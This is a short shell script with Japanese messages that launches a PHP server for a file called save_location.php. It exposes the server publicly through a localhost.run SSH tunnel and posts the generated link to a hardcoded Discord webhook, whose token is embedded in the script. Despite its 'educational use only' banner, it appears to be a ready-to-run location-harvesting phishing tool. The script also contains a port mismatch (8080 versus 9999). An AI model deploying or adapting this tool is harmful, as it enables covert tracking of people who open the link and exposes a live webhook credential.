#!/bin/sh

clear

echo "╔══════════════════════════════════════╗"
echo "║ 🌸 開発者: Devcode                  ║"
echo "║ ⚠️  本ツールは教育目的でのみ使用可能    ║"
echo "╚══════════════════════════════════════╝"

echo "📦 パッケージをインストール中..."
apk update > /dev/null 2>&1
apk add php php-cli php-curl curl openssh grep > /dev/null 2>&1

echo "📄 カレントディレクトリのファイル一覧:"
ls -l

if [ ! -f ./save_location.php ]; then
  echo "⚠️  ./save_location.php がありません。"
  echo "    save_location.php をこのスクリプトと同じディレクトリに配置してください。"
  exit 1
fi

echo "🚀 PHPサーバーを起動中（ポート: 9999, $(pwd) がルート）..."
php -S 0.0.0.0:8080 > /tmp/php-server.log 2>&1 &
php_pid=$!
sleep 2

echo "🌐 トンネル起動中（localhost.run）..."
yes yes | ssh -o StrictHostKeyChecking=accept-new -R 80:localhost:9999 nokey@localhost.run > .log 2>&1 &
ssh_pid=$!
sleep 5

url=$(grep -o 'https://[^ ]*\.lhr\.life' .log | head -n 1)
echo "✨ 発行URL: $url"
echo "🔗 save_location.phpへは: $url/save_location.php でアクセスできます"

webhook_url="https://discord.com/api/webhooks/1361553545379188917/QSKZGGkXtDeqUD4c61hEatZHfY8bD1BObJ1sM250eZpL6O_ocP45oYK1iVy8Y-3eB44q"
json="{\"content\": \"🔔 URLが発行されました\n$url/save_location.php\"}"
curl -H "Content-Type: application/json" -X POST -d "$json" "$webhook_url" > /dev/null 2>&1

echo "📝 PHPサーバーログ出力（直近10行）:"
tail -n 10 /tmp/php-server.log

trap 'echo \"🛑 停止中...\"; kill $php_pid $ssh_pid; exit 0' INT
wait
